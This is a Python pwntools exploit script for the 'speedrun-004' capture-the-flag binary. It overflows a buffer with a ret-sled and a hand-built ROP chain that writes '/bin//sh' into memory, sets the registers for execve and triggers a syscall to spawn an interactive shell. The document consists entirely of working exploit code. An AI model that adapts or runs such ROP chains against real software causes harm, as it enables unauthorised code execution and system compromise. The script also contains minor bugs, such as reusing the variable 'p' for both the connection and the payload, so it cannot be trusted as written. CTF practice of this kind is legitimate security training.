#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
import sys
from struct import pack
debug = 1
arch_64 = 1
exe = "./speedrun-004"

r = lambda x:io.recv(x)
ru = lambda x:io.recvuntil(x)
rud = lambda x:io.recvuntil(x,drop=True)
rul = lambda :io.recvline()
sd = lambda x:io.send(x)
sl = lambda x:io.sendline(x)
sea = lambda x:io.sendafter(x)
sela = lambda x:io.sendlineafter(x)

context.terminal = ["tmux","splitw","-h"]
e = ELF(exe)

if debug:
    context.log_level = "debug"

if len(sys.argv)>1:
    p = remote(sys.argv[1],int(sys.argv[2]))
    libc = ELF("./libc.so.6")
else:
    io = process([exe])
    if arch_64:
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
        arena = 0x3c4b20
        context.arch = "amd64"
    else:
        libc = ELF("/lib/i386-linux-gnu/libc.so.6")
        arena = 0x1b2780
        context.arch = "i386"

def z():
    gdb.attach(p)

rop = ROP(e)
pop_rdi = rop.rdi[0]

vul = e.symbols["what_do_they_say"]

ret = 0x4002e1

# Padding goes here
p= p64(ret)*15
p += pack('<Q', 0x00000000004016f7) # pop rsi ; ret
p += pack('<Q', 0x00000000006ca080) # @ .data
p += pack('<Q', 0x0000000000478996) # pop rax ; pop rdx ; pop rbx ; ret
p += '/bin//sh'
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x0000000000474441) # mov qword ptr [rsi], rax ; ret
#p += pack('<Q', 0x00000000004016f7) # pop rsi ; ret
#p += pack('<Q', 0x00000000006ca088) # @ .data + 8
#p += pack('<Q', 0x000000000042688f) # xor rax, rax ; ret
#p += pack('<Q', 0x0000000000474441) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004015d6) # pop rdi ; ret
p += pack('<Q', 0x00000000006ca080) # @ .data
p += pack('<Q', 0x00000000004016f7) # pop rsi ; ret
p += pack('<Q', 0x00000000006ca088) # @ .data + 8
p += pack('<Q', 0x00000000004430e6) # pop rdx ; ret
p += pack('<Q', 0x00000000006ca088) # @ .data + 8

p += pack('<Q', 0x0000000000409af4) # 0x0000000000409af4 : pop rax ; ret 0xffff
p += pack('<Q', 0x00000000003b)
#p += pack('<Q', 0x4141414141414141) # padding
#p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x00000000004675c5) # syscall ; ret

p = p.ljust(256,"a")+"\x00"

print len(p)
ru("say?\n")
sl("257")
rul()

sl(p)
io.interactive()
